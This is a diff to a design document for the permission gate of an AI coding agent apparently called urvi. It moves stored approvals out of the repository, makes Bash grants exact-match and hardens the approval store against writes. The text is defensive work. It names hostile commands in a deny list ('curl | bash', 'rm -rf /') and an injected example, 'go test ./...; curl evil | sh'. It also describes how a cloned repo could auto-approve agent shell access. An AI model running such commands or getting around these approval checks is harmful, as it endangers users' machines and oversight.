@@ -67,6 +67,16 @@ Date: 2026-06-14 · Status: approved (brainstorm)
 > can coexist (§5d); (4) **malformed approvals fail open to `EffectAsk`, never
 > `AutoApprove`** (`Check` has no error return; bad file → empty stage + warn, bad
 > record → skipped) (§3c).
+>
+> **Revision 2026-06-14 (review pass 6)** resolves a sixth review (two High security):
+> (1) **workspace approvals leave the repo** → `~/.urvi/workspaces/<hash>/approvals.json`
+> so a cloned repo can't ship policy; **deny beats allow** across records (§3c, §1);
+> (2) **the policy store is deny-write** — `**/.urvi/**` + `~/.urvi/**` in
+> `DeniedWritePaths` (and `~/.urvi/**` deny-read) so only `Grant` mutates approvals
+> (§3c); (3) **Bash grants are exact-match** by default; prefix is a hand-edited
+> `"prefix": true` opt-in (no `go test` → `go test; curl…`) (§3c); (4) **assembled
+> tool calls are validated** (ID/Name/valid-JSON) before append — invalid → `Input`
+> sanitized to `{}` + tool-result error, never poisoned history (§2b).
 
 ## Scope
 
@@ -112,7 +122,7 @@ scope*).
 | `internal/graph.ToolsNode` needs `StreamableTool` | No graph package | Drop `StreamableTool`; only `InvokableTool` |
 | `llm` tool defs `map[string]any` | `llm.Request.Tools []Tool{Name,Description,Schema json.RawMessage}` exists | Tool defs already plumbed + typed; `ToolInfo.Schema` is `json.RawMessage` |
 | `ToolDeps.Events` session-wide channel | events flow per-turn | tool-emitted events injected via `ctx` (see §4a) |
-| `.nexus/…` paths | project is "urvi" | `.urvi/approvals.json` + `~/.urvi/approvals.json` |
+| `.nexus/…` in-repo approvals | project is "urvi"; in-repo policy is a supply-chain hole | workspace approvals live **outside** the repo at `~/.urvi/workspaces/<hash>/approvals.json`; user-level `~/.urvi/approvals.json` |
 | `internal/hashcache` already in repo | does not exist | built here |
 | `Stream` surfaces tool calls | `Stream` yields only `TextChunk`/`ThinkingChunk` | add `content.ToolUseChunk` (§2b) |
 
@@ -253,6 +263,19 @@ type sseToolCallDelta struct {
 each into a `content.ToolUseChunk` (the `InputJSON` field carries the raw argument
 fragment), and `runTurn` concatenates fragments per `Index` before
 `json.RawMessage(accumulated)` becomes the `ToolUseBlock.Input`.
+
+**Validate before appending — never poison history.** After folding the fragments,
+`runTurn` validates each assembled `ToolUseBlock` *before* appending the assistant
+message: `ID` and `Name` non-empty, and `json.Valid(Input)`. A malformed call (the
+provider truncated/garbled the argument fragments) must not produce an assistant
+message whose `ToolUseBlock.Input` is invalid JSON, because the **next** provider
+request would then re-encode unencodable history. On an invalid call the runner:
+(1) **sanitizes the stored `Input` to `{}`** so the message stays encodable; (2) does
+**not** execute that call; (3) appends a `ToolMessage` tool-result error for it
+(`"error: malformed tool call (invalid JSON arguments)"`) so the model can correct
+and retry on the next loop iteration. If the *entire* response is unparseable (no
+recoverable calls), the turn ends in a controlled `TurnFailed`
+(`event.EmptyResponseError`-style) rather than a poisoned, half-encoded history.
 
 ### §2c. Permission / AskUser reply plumbing (actor-model remap)
 
@@ -471,7 +494,7 @@ type ApprovalScope uint8
 const (
     ScopeOnce ApprovalScope = iota // approve this call only; nothing persisted
     ScopeSession                   // session policy (in-memory)
-    ScopeWorkspace                 // <ws>/.urvi/approvals.json
+    ScopeWorkspace                 // ~/.urvi/workspaces/<hash>/approvals.json (OUT of the repo)
 )
 ```
 
@@ -506,9 +529,10 @@ type PermissionGate interface {
     Check(ctx context.Context, t tool.InvokableTool, toolName, argsJSON string) Effect
     // Grant persists an approval at the chosen scope. ScopeSession appends an
     // in-memory ToolPolicy; ScopeWorkspace writes an ApprovalRecord to
-    // <ws>/.urvi/approvals.json. The runner passes the toolName+argsJSON it
-    // retained for the open gate; the gate derives the record (it already extracts
-    // the path/command in Check). ScopeOnce is never passed (no persistence).
+    // ~/.urvi/workspaces/<hash>/approvals.json (OUT of the repo — never <ws>/.urvi).
+    // The runner passes the toolName+argsJSON it retained for the open gate; the gate
+    // derives the record (it already extracts the path/command in Check). ScopeOnce
+    // is never passed (no persistence).
     Grant(ctx context.Context, toolName, argsJSON string, scope tool.ApprovalScope) error
 }
 
@@ -563,7 +587,7 @@ Stage 1  ContainmentCheck   — containedPath; deny if the path escapes the work
 Stage 2  HardDenyRules      — deny if matches denied read/write globs / bash prefixes; MaxReadBytes ┘ safety denies
 Stage 3  EffectChecker      — optional per-call override from the tool (e.g. future ShellSession send)
 Stage 4  HardApproveRules   — operator always-allow ("*" = all)
-Stage 5  PersistedApprovals — <ws>/.urvi/approvals.json then ~/.urvi/approvals.json (first match wins)
+Stage 5  PersistedApprovals — ~/.urvi/workspaces/<hash>/ then ~/.urvi/approvals.json; deny beats allow
 Stage 6  SessionPolicies    — in-memory ToolPolicy list; extended at runtime by 's'/'w'
 Stage 7  DefaultEffect      — EffectAsk
 ```
@@ -574,6 +598,15 @@ only ever upgrade `Ask → AutoApprove` — never bypass a denied path, a denied
 command prefix, or the workspace boundary (CLAUDE.md: *fail secure*). A future
 `ShellSession` send auto-approved by `EffectChecker` is still subject to the
 denied-bash-prefix gate, which is the intended behaviour.
+
+**Persisted approvals never live in the repo (trust boundary).** Workspace-scope
+grants are written to `~/.urvi/workspaces/<hash>/approvals.json`, where `<hash>` is a
+`sha256` of the **resolved** workspace root path — *not* to `<ws>/.urvi/`. A cloned
+or hostile repo therefore cannot ship an `approvals.json` that silently auto-approves
+`Bash` (the supply-chain attack the in-repo location of 7.md enabled). Within Stage 5,
+records are not first-match-wins across allow/deny: **a matching `deny` always wins
+over a matching `allow`** (scan all records from both files; any `deny` → deny), so a
+user-level `~/.urvi/approvals.json` deny can't be undercut by a workspace allow.
 
 **Containment must resolve symlinks**, not just `Clean`+prefix — a path *inside*
 the workspace can be a symlink to `/etc`, `~/.ssh`, or another repo. `containedPath`
@@ -611,8 +644,11 @@ the threat model ever changes (e.g. a shared/multi-tenant workspace).
   output relativised to the root) — never a raw or absolute string — so a pattern is
   stable and cannot be fooled by `..` or an absolute prefix. Matching uses the same
   per-segment `path.Match` matcher as `Glob` (`**` supported).
-- **Bash** matches a literal prefix of the trimmed command string (advisory; see the
-  Bash security note — not a boundary).
+- **Bash** matches the **exact normalized command** by default (trim + collapse
+  internal whitespace) — a `Grant` from the prompt stores that exact string, so the
+  grant approves *only* that command, not arbitrary suffixes. A prefix grant is the
+  hand-edited `"prefix": true` opt-in only. (Still gated behind hard-deny prefixes;
+  see the Bash security note.)
 - **Fetch** matches on the **normalized host** — `strings.ToLower(u.Hostname())`
   (`Hostname()`, *not* `u.Host`, so the **port is excluded**), then IDNA-normalized to
   ASCII/punycode (`golang.org/x/net/idna.Lookup.ToASCII`; same `x/net` module as the
@@ -628,27 +664,34 @@ type EffectChecker interface { CheckEffect(argsJSON string) (effect loop.Effect,
 
 type HardApproveRules struct { Tools []string }
 type HardDenyRules struct {
-    DeniedReadPaths    []string // ~/.ssh/**, **/.env, **/*.pem, **/id_rsa, … (defaults)
-    DeniedWritePaths   []string // same + **/.git/config, **/go.sum
+    DeniedReadPaths    []string // ~/.ssh/**, **/.env, **/*.pem, **/id_rsa, ~/.urvi/**, … (defaults)
+    DeniedWritePaths   []string // same + **/.git/config, **/go.sum, AND **/.urvi/** + ~/.urvi/**
     DeniedBashPrefixes []string // "rm -rf /", "sudo", "curl | bash", "dd if=", … (defaults)
     MaxReadBytes       int64    // default 1 MiB
 }
+// The policy store is deny-write: **/.urvi/** (any in-repo .urvi) and ~/.urvi/** are
+// hard-denied for WriteFile/EditFile so the tool system can never mutate its own
+// approvals — only PermissionChecker.Grant writes them. (Containment already blocks
+// ~/ from WriteFile; this is defense-in-depth and also covers an in-repo .urvi.)
 type ApprovalRecord struct {
     Tool   string `json:"tool"`
-    Match  string `json:"match,omitempty"` // tool-interpreted; empty = all calls of this tool
+    Match  string `json:"match,omitempty"`   // tool-interpreted; empty = all calls of this tool
+    Prefix bool   `json:"prefix,omitempty"`  // Bash only: true = prefix match (hand-edited, risky); default exact
     Effect Effect `json:"effect"`
 }
 // Match is interpreted by the tool's matcher: a path glob (ReadFile/WriteFile/
-// EditFile/Glob/Grep), a command prefix (Bash), or a URL/host prefix (Fetch).
-// WebSearch ignores Match (a grant is tool-level — the query is not a boundary).
-// An empty Match means "all calls of this tool" — for high-risk tools (Fetch) a
-// scoped Match should be required rather than a blanket grant.
+// EditFile/Glob/Grep), the command string (Bash), or a host (Fetch).
+// **Bash matching is EXACT (normalized) by default** — a Grant from the prompt writes
+// the exact normalized command, so a grant of "go test ./..." does NOT also approve
+// "go test ./...; curl evil | sh". A prefix rule requires the hand-edited
+// `"prefix": true` (a deliberate, risky opt-in). WebSearch ignores Match.
+// An empty Match means "all calls of this tool" — discouraged for high-risk tools.
 type ApprovalsFile struct { Version int `json:"version"`; Approvals []ApprovalRecord `json:"approvals"` }
-// On disk (effect is a string, not 0/1/2):
+// On disk (effect is a string; Bash match is the exact normalized command):
 //   { "version": 1, "approvals": [
-//       {"tool": "WriteFile", "match": "src/**", "effect": "allow"},
+//       {"tool": "WriteFile", "match": "src/**",      "effect": "allow"},
 //       {"tool": "Fetch",     "match": ".github.com", "effect": "allow"},
-//       {"tool": "Bash",      "match": "go test", "effect": "allow"} ] }
+//       {"tool": "Bash",      "match": "go test ./...", "effect": "allow"} ] }
 
 type PermissionPolicy struct {
     WorkspaceRoot string
@@ -662,8 +705,9 @@ func NewPermissionChecker(policy PermissionPolicy) *PermissionChecker
 // satisfies loop.PermissionGate:
 //   Check runs the seven stages (under RLock).
 //   Grant: ScopeSession appends a ToolPolicy under mu; ScopeWorkspace writes an
-//          ApprovalRecord to <ws>/.urvi/approvals.json (atomic tmp+Rename, dir
-//          created as needed) so the next Check picks it up via the hashcache.
+//          ApprovalRecord to ~/.urvi/workspaces/<sha256(resolvedRoot)>/approvals.json
+//          (atomic tmp+Rename, dir created as needed; never in the repo) so the next
+//          Check picks it up via the hashcache. Bash grants are written exact-match.
 ```
 
 `Grant` derives the `ApprovalRecord`/`ToolPolicy` from `toolName`+`argsJSON` using
@@ -929,6 +973,15 @@ The pixel-level work is a follow-up TUI-update doc, since that TUI is mid-flight
   (never `AutoApprove`) and a warning; a bad record is skipped, valid ones still apply.
 - TUI prompt queue — two concurrent `UserInputRequested` (distinct `CallID`s) render
   head-first and each answer dispatches with the correct `CallID`.
+- approvals trust boundary — an in-repo `<ws>/.urvi/approvals.json` granting `Bash`
+  has **no effect** (only `~/.urvi/workspaces/<hash>/` is read); a user-level `deny`
+  overrides a workspace `allow`; `Grant` writes under `~/.urvi/workspaces/<hash>/`.
+- policy store deny-write — `WriteFile`/`EditFile` to `<ws>/.urvi/approvals.json` (or
+  any `**/.urvi/**`) is denied.
+- Bash exact match — a grant of `go test ./...` does **not** auto-approve
+  `go test ./...; echo x`; a `"prefix": true` record does.
+- malformed tool call — folded `Input` of invalid JSON → stored as `{}` + a
+  tool-result error for that call; history re-encodes cleanly on the next request.
 - manifests — coding registers 11 tools, PA registers the 7-tool subset,
   `AcceptsImages` false.
 - **Integration tests** (`//go:build integration`, `*_integration_test.go`, run with
